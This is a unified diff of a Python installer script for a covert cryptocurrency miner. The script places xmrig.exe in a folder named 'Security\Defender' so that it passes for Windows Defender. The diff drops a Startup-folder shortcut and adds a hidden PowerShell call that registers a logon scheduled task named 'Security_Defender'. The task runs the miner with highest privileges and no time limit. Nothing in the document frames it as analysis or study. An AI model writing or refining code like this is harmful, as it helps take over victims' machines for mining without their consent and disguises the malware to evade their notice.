@@ -12,14 +12,13 @@ User_Name    = getpass.getuser()
 Security_Dir = os.path.join("C:\\Users", User_Name, "Security")
 Defender_Dir = os.path.join(Security_Dir, "Defender")
 Dest_Config  = os.path.join(Defender_Dir, "config.json")
-Dest_Vbs     = os.path.join(Defender_Dir, "Start.vbs")
+Dest_Vbs     = os.path.join(Defender_Dir, "Security.vbs")
 Xmrig_Exe    = os.path.join(Defender_Dir, "xmrig.exe")
 Startup_Dir  = os.path.join(
     "C:\\Users", User_Name,
     "AppData", "Roaming", "Microsoft", "Windows",
     "Start Menu", "Programs", "Startup"
 )
-Lnk_Path     = os.path.join(Startup_Dir, "Security.lnk")
 
 Total_Threads = os.cpu_count() or 1
 
@@ -65,16 +64,29 @@ Vbs_Lines = (
 with open(Dest_Vbs, "w") as F:
     F.write(Vbs_Lines)
 
-os.makedirs(Startup_Dir, exist_ok=True)
+for Old_File in ["Security.vbs", "Security.lnk"]:
+    Old_Path = os.path.join(Startup_Dir, Old_File)
+    if os.path.exists(Old_Path):
+        os.remove(Old_Path)
 
 Ps_Command = (
-    f'$Ws = New-Object -ComObject WScript.Shell; '
-    f'$Sc = $Ws.CreateShortcut("{Lnk_Path}"); '
-    f'$Sc.TargetPath = "{Dest_Vbs}"; '
-    f'$Sc.WorkingDirectory = "{Defender_Dir}"; '
-    f'$Sc.Save()'
+    f"$A = New-ScheduledTaskAction "
+    f"-Execute '{Xmrig_Exe}' "
+    f"-WorkingDirectory '{Defender_Dir}'; "
+    f"$T = New-ScheduledTaskTrigger -AtLogOn; "
+    f"$S = New-ScheduledTaskSettingsSet "
+    f"-ExecutionTimeLimit 0 "
+    f"-StartWhenAvailable $true "
+    f"-MultipleInstances IgnoreNew; "
+    f"$P = New-ScheduledTaskPrincipal "
+    f"-UserId '{User_Name}' "
+    f"-RunLevel Highest "
+    f"-LogonType Interactive; "
+    f"Register-ScheduledTask "
+    f"-TaskName 'Security_Defender' "
+    f"-Action $A -Trigger $T -Settings $S -Principal $P -Force"
 )
 subprocess.run(
-    ["powershell", "-WindowStyle", "Hidden", "-Command", Ps_Command],
+    ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", Ps_Command],
     check=True
 )
